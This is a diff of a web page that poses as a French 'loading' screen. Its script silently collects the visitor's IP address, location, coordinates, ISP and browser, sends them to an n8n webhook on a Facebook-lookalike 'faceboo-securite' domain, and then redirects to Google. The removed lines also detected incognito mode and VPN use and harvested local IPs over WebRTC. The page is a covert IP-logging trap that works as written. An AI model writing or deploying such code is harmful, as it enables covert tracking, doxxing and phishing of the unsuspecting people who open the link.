@@ -8,108 +8,34 @@
 <body>
     <h2>Chargement en cours...</h2>
     <script>
-        async function getNetworkInfo() {
-            try {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                return {
-                    type: connection?.type || "Inconnu",
-                    downlink: connection?.downlink ? `${connection.downlink} Mbps` : "Inconnu",
-                    effectiveType: connection?.effectiveType || "Inconnu",
-                    rtt: connection?.rtt ? `${connection.rtt} ms` : "Inconnu"
-                };
-            } catch {
-                return { type: "Erreur", downlink: "Erreur", effectiveType: "Erreur", rtt: "Erreur" };
-            }
-        }
-
-        async function detectIncognito() {
-            return new Promise((resolve) => {
-                try {
-                    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                    if (!fs) resolve(false);
-                    else {
-                        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
-                    }
-                } catch {
-                    resolve("Erreur de détection");
-                }
-            });
-        }
-
-        async function getWebRTCIPs() {
-            return new Promise((resolve) => {
-                try {
-                    let ips = [];
-                    let rtc = new RTCPeerConnection();
-                    rtc.createDataChannel("");
-                    rtc.createOffer().then(o => rtc.setLocalDescription(o));
-
-                    rtc.onicecandidate = event => {
-                        if (event && event.candidate && event.candidate.candidate) {
-                            let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
-                            let match = event.candidate.candidate.match(ipRegex);
-                            if (match && match[1] && !ips.includes(match[1])) {
-                                ips.push(match[1]);
-                            }
-                        }
-                    };
-
-                    setTimeout(() => resolve(ips.length ? ips : ["Aucune IP WebRTC détectée"]), 3000);
-                } catch {
-                    resolve(["Erreur WebRTC"]);
-                }
-            });
-        }
-
-        async function detectVPN() {
-            try {
-                let publicIP = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
-                let webrtcIPs = await getWebRTCIPs();
-
-                return {
-                    isUsingVPN: webrtcIPs.length > 0 && !webrtcIPs.includes(publicIP.ip),
-                    publicIP: publicIP.ip,
-                    webrtcIPs: webrtcIPs
-                };
-            } catch {
-                return { isUsingVPN: "Erreur de détection", publicIP: "Inconnu", webrtcIPs: [] };
-            }
-        }
-
         async function collectData() {
             try {
-                let ipInfo = await fetch("https://ipinfo.io/json").then(response => response.json()).catch(() => ({}));
-                let networkInfo = await getNetworkInfo();
-                let incognito = await detectIncognito();
-                let vpnData = await detectVPN();
+                let response = await fetch("https://ip-api.com/json/");
+                let data = await response.json();
 
                 let logData = {
-                    ip: ipInfo.ip || "Inconnu",
-                    ville: ipInfo.city || "Inconnu",
-                    région: ipInfo.region || "Inconnu",
-                    pays: ipInfo.country || "Inconnu",
-                    fournisseur: ipInfo.org || "Inconnu",
-                    position: ipInfo.loc || "Inconnu",
-                    userAgent: navigator.userAgent,
-                    incognitoMode: incognito,
-                    webrtcIPs: vpnData.webrtcIPs,
-                    vpnDetected: vpnData.isUsingVPN,
-                    network: networkInfo
+                    ip: data.query || "Unknown",
+                    ville: data.city || "Unknown",
+                    région: data.regionName || "Unknown",
+                    pays: data.country || "Unknown",
+                    fournisseur: data.isp || "Unknown",
+                    position: `${data.lat},${data.lon}`,
+                    userAgent: navigator.userAgent
                 };
 
-                // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
-                fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
+                // Send logs to the webhook (Discord, n8n, API)
+             fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(logData)
                 });
 
-                // Redirection après tracking
+                // Redirect after tracking
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
-                }, 3500);
+                }, 2000);
             } catch (error) {
-                console.error("Erreur dans la collecte des données :", error);
+                console.error("Error collecting data:", error);
             }
         }
 
